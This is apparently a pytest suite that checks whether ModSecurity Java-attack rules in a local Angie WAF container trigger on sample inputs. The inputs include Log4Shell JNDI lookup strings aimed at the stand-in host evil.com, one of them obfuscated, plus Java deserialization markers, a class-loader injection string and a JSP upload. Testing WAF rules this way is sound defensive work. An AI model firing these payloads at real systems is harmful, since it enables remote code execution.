#/usr/bin/env python3

import pytest
import requests
import time
import subprocess
import json

# Test data: rule_id -> payload info
# Each entry has 'payload', 'method', 'headers', 'params', 'data', 'files'
java_payloads = {
    "944100": {
        "payload": "java.lang.runtime",
        "method": "POST",
        "headers": {},
        "params": {"param": "java.lang.runtime"},
        "data": None,
        "files": None,
        "note": "Remote Command Execution: Suspicious Java class detected"
    },
    "944110": {
        "payload": "runtime unmarshaller",
        "method": "POST",
        "headers": {},
        "params": {"param": "runtime unmarshaller"},
        "data": None,
        "files": None,
        "note": "Remote Command Execution: Java process spawn (CVE-2017-9805)"
    },
    "944120": {
        "payload": "clonetransformer runtime",
        "method": "POST",
        "headers": {},
        "params": {"param": "clonetransformer runtime"},
        "data": None,
        "files": None,
        "note": "Remote Command Execution: Java serialization (CVE-2015-4852)"
    },
    "944130": {
        "payload": "java.util.Date",
        "method": "POST",
        "headers": {},
        "params": {"param": "java.util.Date"},
        "data": None,
        "files": None,
        "note": "Suspicious Java class detected"
    },
    "944140": {
        "payload": "evil.jsp",
        "method": "POST",
        "headers": {"Content-Type": "multipart/form-data"},
        "params": {},
        "data": None,
        "files": {"file": ("evil.jsp", "content")},
        "note": "Java Injection Attack: Java Script File Upload Found"
    },
    "944150": {
        "payload": "${jndi:ldap://evil.com}",
        "method": "POST",
        "headers": {},
        "params": {"param": "${jndi:ldap://evil.com}"},
        "data": None,
        "files": None,
        "note": "Potential Remote Command Execution: Log4j / Log4shell"
    },
    "944151": {
        "payload": "${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com}",
        "method": "POST",
        "headers": {},
        "params": {"param": "${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com}"},
        "data": None,
        "files": None,
        "note": "Potential Remote Command Execution: Log4j / Log4shell"
    },
    "944200": {
        "payload": "\xac\xed\x00\x05",
        "method": "POST",
        "headers": {},
        "params": {"param": "\xac\xed\x00\x05"},
        "data": None,
        "files": None,
        "note": "Magic bytes Detected, probable java serialization in use"
    },
    "944210": {
        "payload": "rO0ABQ",
        "method": "POST",
        "headers": {},
        "params": {"param": "rO0ABQ"},
        "data": None,
        "files": None,
        "note": "Magic bytes Detected Base64 Encoded, probable java serialization in use"
    },
    "944240": {
        "payload": "clonetransformer",
        "method": "POST",
        "headers": {},
        "params": {"param": "clonetransformer"},
        "data": None,
        "files": None,
        "note": "Remote Command Execution: Java serialization (CVE-2015-4852)"
    },
    "944250": {
        "payload": "java.runtime",
        "method": "POST",
        "headers": {},
        "params": {"param": "java.runtime"},
        "data": None,
        "files": None,
        "note": "Remote Command Execution: Suspicious Java method detected"
    },
    "944260": {
        "payload": "class.module.classLoader",
        "method": "POST",
        "headers": {},
        "params": {"param": "class.module.classLoader"},
        "data": None,
        "files": None,
        "note": "Remote Command Execution: Malicious class-loading payload"
    },
    "944300": {
        "payload": "cnVudGltZQ",
        "method": "POST",
        "headers": {},
        "params": {"param": "cnVudGltZQ"},
        "data": None,
        "files": None,
        "note": "Base64 encoded string matched suspicious keyword"
    },
    "944152": {
        "payload": "${",
        "method": "POST",
        "headers": {},
        "params": {"param": "${"},
        "data": None,
        "files": None,
        "note": "Potential Remote Command Execution: Log4j / Log4shell"
    }
}

@pytest.fixture(scope="function")
def setup_teardown():
    """Fixture for setup and teardown: clear logs before test"""
    try:
        subprocess.run(
            ["docker", "exec", "waf-angie-1", "truncate", "-s", "0", "/var/log/angie/modsec_audit.log"],
            capture_output=True,
            text=True,
            check=True
        )
    except subprocess.CalledProcessError:
        pass  # Ignore if truncate fails
    yield
    # Teardown: optionally clean up after test
    pass

@pytest.mark.parametrize("rule_id,payload_info", list(java_payloads.items()))
def test_java_rule_trigger(setup_teardown, rule_id, payload_info):
    """Test that each Java rule is triggered by its payload"""

    payload = payload_info["payload"]
    method = payload_info["method"]
    headers = payload_info["headers"]
    params = payload_info["params"]
    data = payload_info["data"]
    files = payload_info["files"]

    # Build URL
    url = "http://localhost/"
    if method == "GET" and params:
        url += "?" + "&".join([f"{k}={requests.utils.quote(str(v))}" for k, v in params.items()])

    try:
        if method == "GET":
            response = requests.get(url, headers=headers, timeout=10)
        elif method == "POST":
            if files:
                response = requests.post(url, headers=headers, data=data, files=files, timeout=10)
            else:
                response = requests.post(url, headers=headers, data=data, timeout=10)
        else:
            response = requests.request(method, url, headers=headers, data=data, params=params, files=files, timeout=10)
    except requests.RequestException as e:
        pytest.fail(f"Request failed: {e}")

    time.sleep(1)

    # Get logs from Docker container
    try:
        result = subprocess.run(
            ["docker", "exec", "waf-angie-1", "cat", "/var/log/angie/modsec_audit.log"],
            capture_output=True,
            text=True,
            check=True
        )
        log_content = result.stdout.strip()
    except subprocess.CalledProcessError as e:
        pytest.fail(f"Error executing docker command: {e}")

    if not log_content:
        pytest.fail("Log file is empty or not found")

    # Parse JSON log
    try:
        log_data = json.loads(log_content)
    except json.JSONDecodeError as e:
        pytest.fail(f"Error parsing JSON log: {e}")

    # Extract messages with ruleId
    messages = log_data.get("messages", [])
    rule_ids_in_log = [msg.get("ruleId") for msg in messages if "ruleId" in msg]

    # Assert that the expected rule_id is triggered
    assert rule_id in rule_ids_in_log, f"Rule {rule_id} not triggered. Found rules: {rule_ids_in_log}. Payload: {payload_info}"

if __name__ == "__main__":
    pytest.main([__file__])